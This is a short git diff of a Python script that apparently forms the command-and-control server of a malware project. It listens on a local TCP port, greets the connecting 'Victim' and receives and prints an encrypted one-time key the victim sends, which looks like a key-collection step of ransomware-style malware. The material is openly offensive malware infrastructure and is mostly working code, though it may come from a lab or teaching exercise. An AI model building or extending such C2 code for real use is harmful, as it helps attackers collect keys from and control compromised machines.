@@ -4,10 +4,22 @@
 # after everything is set up.
 
 from C2 import *;
+import sys
 import socket
+import numpy as np
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-    sock.bind(('127.0.0.1',PORT_SVR));
-    sock.listen(1);
+    sock.bind(('127.0.0.1',PORT_SVR))
+    sock.listen(1)
     conn, addr = sock.accept()
-
+    with conn:
+        print("C2 Server >> Victim",addr,'connected')
+        OTPPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
+        if(conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved");
+            sys.exit(-1)
+        print("OTPPacketLen: ", hex(OTPPacketLen))
+        EncryptedOTP = conn.recv(OTPPacketLen)
+        print(''.join('0x{:02x} '.format(x) for x in EncryptedOTP))
+        print("EncryptedOTP recieved")
+  
